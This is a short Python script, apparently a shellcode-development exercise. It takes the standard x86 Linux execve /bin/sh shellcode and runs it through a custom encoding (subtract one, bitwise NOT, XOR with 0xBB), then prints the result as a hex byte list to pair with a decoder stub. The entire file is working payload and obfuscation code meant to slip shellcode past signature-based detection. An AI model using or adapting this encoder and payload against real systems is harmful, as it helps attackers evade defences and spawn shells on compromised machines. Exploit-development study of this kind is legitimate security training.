#!/bin/python

import socket
import sys

sc_original = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

#sc_original = sc_original1[::-1]

enc = ""
enc2= ""

for c in bytearray(sc_original):
	a = c - 0x01
	b = ~a
	c = b^0xBB

	enc+= '\\x'
	enc+= "%02x" %(c & 0xff)

	enc2+= "0x"
	enc2+= "%02x," %(c & 0xff)


print("Encoded Payload:  ")
print("----------------------")

s2 = enc2.rstrip(',')
print(s2)



